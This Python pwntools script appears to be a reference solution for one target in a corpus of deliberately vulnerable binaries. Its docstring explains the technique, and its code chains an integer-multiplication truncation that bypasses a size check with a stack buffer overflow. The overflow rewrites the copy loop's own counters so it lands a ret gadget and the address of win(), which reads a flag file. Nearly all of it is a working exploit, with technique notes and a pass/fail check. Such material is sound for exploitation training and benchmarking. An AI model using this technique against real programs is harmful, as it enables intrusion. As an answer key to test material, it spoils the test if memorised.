#!/usr/bin/env python3
"""
Hand-verified standalone pwntools reference exploit for corpus_r2 target
08_int_mul_overflow.

Technique: CWE-190 integer/size-arithmetic bug. The record count `len`
(0-255) is multiplied by the fixed 8-byte record size and the PRODUCT is
truncated back into an `unsigned char` before being compared against
sizeof(buf)==64. len=32 makes (unsigned char)(32*8) == (unsigned char)256
== 0, which passes the "total_bytes <= 64" gate, but the untruncated
`len` (32) still drives a real copy loop of 32 * 8 = 256 bytes into the
64-byte stack buffer `buf`.

Protections: canary=OFF, NX=ON, PIE=OFF, RELRO=partial, dynamic.

Two non-obvious wrinkles discovered while verifying this exploit:

1. The record count is read via a hand-rolled byte-at-a-time parser
   (read_count()), not scanf() -- an earlier version used scanf("%hhu",
   &len), and glibc's buffered stdio performed its own readahead on fd 0
   that silently stole bytes meant for the later raw read() calls in the
   overflow loop, corrupting the exploit's byte accounting in a way that
   depended on delivery timing. Confirmed via strace that switching to a
   read()-only parser (still present in the current source) makes byte
   consumption exact and deterministic.

2. THE REAL OFFSET SUBTLETY: `buf` is at rbp-0x50, but the loop's own
   control variables -- total_bytes (rbp-0x6, overflow offset 74), `len`
   (rbp-0x5, offset 75), and `i` (rbp-0x4..rbp-0x1, offsets 76-79) -- sit
   BETWEEN buf and the saved-rbp/return-address (offsets 80/88). Because
   both `len` and `i` are reloaded from memory on every iteration (never
   cached across iterations), a naive contiguous overflow silently
   corrupts its own loop counter mid-write: the 10th read() call (i=9,
   writing offsets 72-79) overwrites len and i with whatever attacker
   bytes are there, and the loop's very next bounds check uses those new
   values -- for pure 'A' filler that reads as a huge `i` and small
   `len`, so the loop self-terminates immediately, well before reaching
   the actual return address at offset 88.
   The fix is to WEAPONIZE this rather than avoid it: iteration i=9's
   8-byte chunk is crafted so that after it lands, len_new=13 and
   i_new=10 (which then becomes 11 after the loop's own "i++"). Since
   11 < 13, the loop survives for exactly two more iterations: the next
   read() (now using the just-injected i=11) writes directly to the
   return-address slot (buf_base + 11*8 == rbp+8), and the read() after
   that (i=12) writes to the 8 bytes right after it -- i.e. exactly where
   the alignment-fixer `ret` gadget's own return address needs to go.
   After that, i becomes 13 == len, and the loop exits on its own.

3. Same ABI-alignment issue as targets 04/05/10: a `ret`-based hijack
   enters the callee 8 bytes off the mandated 16-byte alignment, which
   now matters because win() calls fopen() (internal SIMD-aligned malloc
   code) to read flag.txt at runtime. One bare `ret` gadget (the tail of
   win() itself) is inserted before win()'s real address to fix parity.

Anti-gaming: confirmed with benign inputs (no digits at all, and a small
legitimate count like "3") that the program loads harmlessly and exits
via the normal "done" path (rc=0) -- the flag is only reachable via the
crafted len=32 overflow chain above.

Run directly:
    python3 08_int_mul_overflow_reference.py
"""
import os
import sys

from pwn import *

HERE = os.path.dirname(os.path.abspath(__file__))
TARGET_DIR = os.path.join(HERE, "..", "corpus_r2", "08_int_mul_overflow")
BINARY = os.path.join(TARGET_DIR, "int_mul_overflow")
FLAG_FILE = os.path.join(TARGET_DIR, "flag.txt")

context.arch = "amd64"
context.log_level = "error"


def exploit():
    elf = ELF(BINARY, checksec=False)
    win_addr = elf.symbols["win"]
    # Bare `ret` at the tail of win() -- alignment fixer, see docstring.
    ret_fixer = win_addr + 0xF  # win():0x4012be -> ret at 0x4012cd

    io = process(elf.path, cwd=TARGET_DIR)
    io.recvuntil(b"records (0-8, 8 bytes each): ")
    io.sendline(b"32")  # (unsigned char)(32*8) == 0 <= 64: bypasses the check
    io.recvuntil(b"loading 32 records...\n")

    # Iteration i=9's chunk (global overflow offsets 72-79): overwrites
    # total_bytes (offset 74, unused after the check -- arbitrary),
    # len (offset 75 -> 13), and i (offsets 76-79 -> 10, becomes 11 after
    # the loop's own increment).
    chunk9 = b"\x00\x00\x00" + bytes([13]) + p32(10)

    payload = b"A" * 72   # iterations i=0..8 (offsets 0-71): plain filler
    payload += chunk9     # iteration i=9: len/i control
    payload += p64(ret_fixer)  # iteration i=11 (skips 10): retaddr slot
    payload += p64(win_addr)   # iteration i=12: fixer's own retaddr
    io.send(payload)
    return io


def main():
    with open(FLAG_FILE) as f:
        expected_flag = f.read().strip()

    io = exploit()
    output = io.recvrepeat(timeout=3)
    io.close()

    ok = expected_flag.encode() in output
    print(f"[{'PASS' if ok else 'FAIL'}] 08_int_mul_overflow: "
          f"expected flag {'found' if ok else 'NOT found'} in output")
    if not ok:
        print("---- captured output ----")
        print(output)
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
